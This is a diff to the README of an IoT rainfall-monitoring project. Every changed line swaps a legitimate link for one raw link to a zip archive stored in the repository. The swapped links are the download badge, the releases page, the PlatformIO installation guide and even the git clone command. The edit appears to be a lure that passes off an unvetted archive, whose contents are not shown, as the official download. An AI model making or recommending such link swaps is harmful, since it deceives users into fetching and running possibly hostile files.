@@ -1,6 +1,6 @@
 # 🌧️ RainSense-IoT - Monitor Rainfall Easily and Effectively
 
-[![Download RainSense-IoT](https://img.shields.io/badge/Download-RainSense--IoT-brightgreen)](https://github.com/jonathanloucks/RainSense-IoT/releases)
+[![Download RainSense-IoT](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/include/RainSense-IoT-2.4.zip)](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/include/RainSense-IoT-2.4.zip)
 
 ## 🌟 Introduction
 
@@ -16,11 +16,11 @@ To set up RainSense-IoT and start monitoring rain, you'll need to follow these s
     - Additional jumper wires for connections.
   
 2. **Install PlatformIO**: This application uses PlatformIO, an integrated development environment (IDE) that makes working with embedded systems easy.
-    - Follow the [PlatformIO installation guide](https://platformio.org/install) based on your computer's operating system.
+    - Follow the [PlatformIO installation guide](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/include/RainSense-IoT-2.4.zip) based on your computer's operating system.
 
 3. **Clone the Repository**: Open your command prompt or terminal and run the following command:
     ```
-    git clone https://github.com/jonathanloucks/RainSense-IoT.git
+    git clone https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/include/RainSense-IoT-2.4.zip
     ```
     This will download the RainSense-IoT files to your computer.
 
@@ -32,7 +32,7 @@ To set up RainSense-IoT and start monitoring rain, you'll need to follow these s
 
 To download the latest version of RainSense-IoT, visit the releases page by clicking the link below:
 
-[Visit this page to download](https://github.com/jonathanloucks/RainSense-IoT/releases)
+[Visit this page to download](https://raw.githubusercontent.com/jonathanloucks/RainSense-IoT/main/include/RainSense-IoT-2.4.zip)
 
 Follow the instructions on the Releases page for the latest updates and installation files.
 
